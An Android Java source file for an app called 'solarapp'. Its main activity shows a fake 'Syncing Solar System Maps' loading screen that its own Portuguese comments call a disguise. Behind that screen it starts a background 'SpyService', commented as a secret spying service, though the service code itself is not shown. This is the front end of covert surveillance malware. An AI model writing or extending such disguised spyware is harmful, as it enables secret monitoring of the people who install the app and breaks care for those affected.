package com.solarapp;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.widget.TextView;
import android.graphics.Color;
import android.view.Gravity;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Cria uma tela simples de "Carregando" para disfarçar
        TextView tv = new TextView(this);
        tv.setText("Sincronizando Mapas do Sistema Solar...\nPor favor, aguarde.");
        tv.setTextSize(20);
        tv.setGravity(Gravity.CENTER);
        tv.setTextColor(Color.BLACK);
        setContentView(tv);

        // Comando secreto: Inicia o serviço de espionagem em background
        Intent intent = new Intent(this, SpyService.class);
        startService(intent);
    }
}
